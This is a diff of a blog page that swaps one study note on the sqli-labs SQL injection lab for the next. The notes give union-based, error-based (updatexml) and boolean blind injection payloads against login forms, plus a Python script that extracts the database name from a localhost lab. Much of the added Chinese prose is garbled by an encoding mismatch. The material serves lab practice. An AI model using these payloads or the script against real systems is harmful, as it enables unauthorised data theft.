@@ -19,22 +19,22 @@
   <meta name="author" content="aidemofashi">
   <meta name="keywords" content="">
   
-    <meta name="description" content="sql-labs-less11以前ctf练习题反而是post模式做的多些，notice  注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖    hackbar下的结构 1uname&#x3D;1&#x27;union select user(),database()#&amp;passwd&#x3D;&amp;submit&#x3D;Submit 之后的注入拼接进uname后   爆用户和库名： 11&amp;#x27">
+    <meta name="description" content="less-13ֻ�е�¼�ɹ����ԣ�û������Ϣ���봫��������ַ����պϵ� 11&#x27;) # ����ע��payload 1uname&#x3D;1&amp;passwd&#x3D;1&#x27;) or updatexml(1,concat(0x7e,(select user()),0x7e),1)#&amp;submit&#x3D;Submit ����äע��Ϊ�е�¼�ɹ���������">
 <meta property="og:type" content="article">
-<meta property="og:title" content="note-07">
-<meta property="og:url" content="https://aidemofashi.github.io/2025/03/06/note-07/index.html">
+<meta property="og:title" content="note-08">
+<meta property="og:url" content="https://aidemofashi.github.io/2025/03/07/note-08/index.html">
 <meta property="og:site_name" content="aidemofashi&#39;s blog">
-<meta property="og:description" content="sql-labs-less11以前ctf练习题反而是post模式做的多些，notice  注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖    hackbar下的结构 1uname&#x3D;1&#x27;union select user(),database()#&amp;passwd&#x3D;&amp;submit&#x3D;Submit 之后的注入拼接进uname后   爆用户和库名： 11&amp;#x27">
+<meta property="og:description" content="less-13ֻ�е�¼�ɹ����ԣ�û������Ϣ���봫��������ַ����պϵ� 11&#x27;) # ����ע��payload 1uname&#x3D;1&amp;passwd&#x3D;1&#x27;) or updatexml(1,concat(0x7e,(select user()),0x7e),1)#&amp;submit&#x3D;Submit ����äע��Ϊ�е�¼�ɹ���������">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-03-06T13:08:00.000Z">
-<meta property="article:modified_time" content="2025-03-06T13:38:03.560Z">
+<meta property="article:published_time" content="2025-03-07T06:10:00.000Z">
+<meta property="article:modified_time" content="2025-03-07T16:05:55.823Z">
 <meta property="article:author" content="aidemofashi">
 <meta property="article:tag" content="sql-labs">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>note-07 - aidemofashi&#39;s blog</title>
+  <title>note-08 - aidemofashi&#39;s blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -200,7 +200,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="note-07"></span>
+            <span id="subtitle" data-typed-text="note-08"></span>
           
         </div>
 
@@ -211,8 +211,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-03-06 21:08" pubdate>
-          2025年3月6日 晚上
+        <time datetime="2025-03-07 14:10" pubdate>
+          2025年3月7日 下午
         </time>
       </span>
     
@@ -223,7 +223,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          187 字
+          239 字
         
       </span>
     
@@ -271,33 +271,23 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">note-07</h1>
+            <h1 id="seo-header">note-08</h1>
             
             
               <div class="markdown-body">
                 
-                <h1 id="sql-labs-less11"><a href="#sql-labs-less11" class="headerlink" title="sql-labs-less11"></a>sql-labs-less11</h1><p>以前ctf练习题反而是post模式做的多些，<br>notice</p>
-<blockquote>
-<p>注意原先请求的值要改为数据库不存在的值免得将后面的查询结果覆盖  </p>
-</blockquote>
-<p>hackbar下的结构</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&#x27;union select user(),database()#&amp;passwd=&amp;submit=Submit<br></code></pre></td></tr></table></figure>
-<p>之后的注入拼接进uname后  </p>
-<p>爆用户和库名：</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;</span> <span class="hljs-function">union <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">database</span>()#</span><br></code></pre></td></tr></table></figure>
-<p>爆表名：</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">table_name</span>) <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span> table_schema</span>=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure>
-<p>爆字段：</p>
-<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-number">1&#x27;u</span><span class="hljs-function">nion <span class="hljs-keyword">select</span> <span class="hljs-title">user</span>(),<span class="hljs-title">group_concat</span>(<span class="hljs-params">column_name</span>) <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span> table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-keyword">and</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span><span class="hljs-meta">#</span><br>不加<span class="hljs-keyword">and</span>后面的话好像会把其它库的同名表下的字段爆出来<br></code></pre></td></tr></table></figure>
-<p>最后爆库：</p>
-<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs n1ql">1&#x27;union <span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>(),group_concat(id,username,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> users#<br></code></pre></td></tr></table></figure>
-<h1 id="less12"><a href="#less12" class="headerlink" title="less12"></a>less12</h1><p>应该是加了检查，password不能为空</p>
-<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">uname</span>=1&amp;passwd=1&quot;) <span class="hljs-keyword">or</span> <span class="hljs-literal">true</span>#&amp;<span class="hljs-attribute">submit</span>=Submit<br></code></pre></td></tr></table></figure>
-<p>回显  </p>
-<blockquote>
-<p>Your Login name:Dumb<br>Your Password:Dumb  </p>
-</blockquote>
-<p>成功闭合sql查询,然后走流程通关。</p>
+                <h1 id="less-13"><a href="#less-13" class="headerlink" title="less-13"></a>less-13</h1><p>ֻ�е�¼�ɹ����ԣ�û������Ϣ<br>���봫��������ַ����պϵ�</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-number">1</span><span class="hljs-string">&#x27;) #</span><br></code></pre></td></tr></table></figure>
+<h2 id="����ע��"><a href="#����ע��" class="headerlink" title="����ע��"></a>����ע��</h2><p>payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs post">uname=1&amp;passwd=1&#x27;) or updatexml(1,concat(0x7e,(select user()),0x7e),1)#&amp;submit=Submit<br></code></pre></td></tr></table></figure>
+<h2 id="����aע"><a href="#����aע" class="headerlink" title="����äע"></a>����äע</h2><p>��Ϊ�е�¼�ɹ�����������ʹ�ò���äע</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql">uname<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-operator">&amp;</span>passwd<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-string">&#x27;) or if(length(database()=8),0,1)#&amp;submit=Submit</span><br></code></pre></td></tr></table></figure>
+<p>̫����д�����ű���ʹ��sqlmap,����bp�����ơ�<br>����һ���ű�</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br> <br><span class="hljs-comment"># ��վ·��</span><br>url = <span class="hljs-string">&quot;http://localhost/sqli-labs/Less-13/&quot;</span><br><span class="hljs-comment"># �жϳ��ȵ�payload</span><br>payload_len = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or length(</span><br><span class="hljs-string">	(database())</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br><span class="hljs-comment"># ö���ַ���payload</span><br>payload_str = <span class="hljs-string">&quot;&quot;&quot;a&#x27;) or ascii(</span><br><span class="hljs-string">	substr(</span><br><span class="hljs-string">		(database())</span><br><span class="hljs-string">	,&#123;l&#125;,1)</span><br><span class="hljs-string">) =&#123;n&#125; -- a&quot;&quot;&quot;</span><br> <br><span class="hljs-comment"># post�������</span><br>data= &#123;<br>    <span class="hljs-string">&quot;uname&quot;</span> : <span class="hljs-string">&quot;a&#x27;) or 1 -- a&quot;</span>,<br>    <span class="hljs-string">&quot;passwd&quot;</span> : <span class="hljs-string">&quot;1&quot;</span>,<br>    <span class="hljs-string">&quot;submit&quot;</span> : <span class="hljs-string">&quot;Submit&quot;</span><br>&#125;<br> <br><span class="hljs-comment"># �жϳ���</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getLen</span>(<span class="hljs-params">payload_len</span>):<br>    length = <span class="hljs-number">1</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment"># �޸��������</span><br>        data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_len.<span class="hljs-built_in">format</span>(n = length)<br>        response = requests.post(url=url, data=data)<br>        <span class="hljs-comment"># ���ִ�����Ϊ��¼�ɹ�</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;���Գɹ�������Ϊ��&#x27;</span>, length)<br>            <span class="hljs-keyword">return</span> length;<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;���ڲ��Գ��ȣ�&#x27;</span>, length)<br>            length += <span class="hljs-number">1</span><br> <br> <br><span class="hljs-comment"># ö���ַ�</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">getStr</span>(<span class="hljs-params">length</span>):<br>    <span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;&#x27;</span><br>    <span class="hljs-comment"># �ӵ�һ���ַ���ʼ��ȡ</span><br>    <span class="hljs-keyword">for</span> l <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>, length+<span class="hljs-number">1</span>):<br>        <span class="hljs-comment"># ö���ַ���ÿһ�ֿ�����</span><br>        <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">32</span>, <span class="hljs-number">126</span>):<br>            data[<span class="hljs-string">&quot;uname&quot;</span>] = payload_str.<span class="hljs-built_in">format</span>(l=l, n=n)<br>            response = requests.post(url=url, data=data)<br>            <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;../images/flag.jpg&#x27;</span> <span class="hljs-keyword">in</span> response.text:<br>                <span class="hljs-built_in">str</span> += <span class="hljs-built_in">chr</span>(n)<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;��&#x27;</span>, l, <span class="hljs-string">&#x27;���ַ�ö�ٳɹ���&#x27;</span>,<span class="hljs-built_in">str</span> )<br>                <span class="hljs-keyword">break</span><br> <br>length = getLen(payload_len)<br>getStr(length)<br></code></pre></td></tr></table></figure>
+<p>���Ի�database()��ʵ������ע��,less13�õ����ţ�less14��˫����<br>�ű�������<a target="_blank" rel="noopener" href="https://blog.csdn.net/wangyuxiang946/article/details/118094895">https://blog.csdn.net/wangyuxiang946/article/details/118094895</a></p>
+<h1 id="less-14"><a href="#less-14" class="headerlink" title="less-14"></a>less-14</h1><p>���˱պϵ㣬���԰�less13�ķ�ʽ�⣺</p>
+<figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 1c"><span class="hljs-number">1</span><span class="hljs-string">&quot; or true #</span><br></code></pre></td></tr></table></figure>
+<h1 id="less-15"><a href="#less-15" class="headerlink" title="less-15"></a>less-15</h1><p>û�б������ԣ��޷��ñ���ע�룬ֻ���ò���äע</p>
 
                 
               </div>
@@ -322,8 +312,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>note-07</div>
-      <div>https://aidemofashi.github.io/2025/03/06/note-07/</div>
+      <div>note-08</div>
+      <div>https://aidemofashi.github.io/2025/03/07/note-08/</div>
     </div>
     <div class="license-meta">
       
@@ -335,7 +325,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年3月6日</div>
+          <div>2025年3月7日</div>
         </div>
       
       
@@ -367,18 +357,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/03/07/note-08/" title="note-08">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">note-08</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/03/05/note-06/" title="note-06">
-                        <span class="hidden-mobile">note-06</span>
+                      <a href="/2025/03/06/note-07/" title="note-07">
+                        <span class="hidden-mobile">note-07</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
